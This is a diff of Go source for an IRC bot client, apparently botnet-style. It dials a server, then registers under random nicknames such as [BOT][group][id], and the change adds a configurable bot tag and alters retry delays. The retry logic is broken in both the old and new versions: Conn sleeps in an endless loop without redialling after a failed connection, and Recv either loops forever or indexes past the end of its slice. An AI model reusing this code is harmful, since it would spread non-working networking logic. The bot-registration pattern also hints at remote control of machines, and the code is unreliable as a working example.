@@ -11,28 +11,23 @@ import (
 func Conn(server string) net.Conn {
 	conn, err := net.Dial("tcp", server)
 	for err != nil {
-		time.Sleep(10 * time.Second)
+		time.Sleep(5 * time.Second)
 		continue
 	}
 	return conn
 }
 
-func Recv(str string, arg int) string {
-	for {
-		recv := strings.Split(str, " ")
-		if len(recv) == arg {
-			continue
-		}
-		return recv[arg]
+func Recv(str string, args int) string {
+	recv := strings.Split(str, " ")
+	for len(recv) == args {
+		time.Sleep(5 * time.Second)
+		continue
 	}
+	return recv[args]
 }
 
 func Find(read, str string) bool {
 	return strings.Contains(read, str)
-}
-
-func name(alphabet rune) string {
-	return string(alphabet + rune(rand.Intn(26)))
 }
 
 func (b *Bot) Send(str string) {
@@ -45,11 +40,11 @@ func (b *Bot) Report(str string) {
 
 func (b *Bot) Login() {
 	rand.Seed(time.Now().UnixNano())
-	id := rand.Intn(10000000)
-	group := name('A')
+	id := rand.Intn(1000000)
+	group := genName('A')
 
-	user := fmt.Sprint("USER [BOT][", group, "][", id, "]", " 8 * :bot")
-	nick := fmt.Sprint("NICK [BOT][", group, "][", id, "]")
+	user := fmt.Sprint("USER ["+b.BotTag+"][", group, "][", id, "]", " 8 * :bot")
+	nick := fmt.Sprint("NICK ["+b.BotTag+"][", group, "][", id, "]")
 
 	b.Send(user)
 	b.Send(nick)
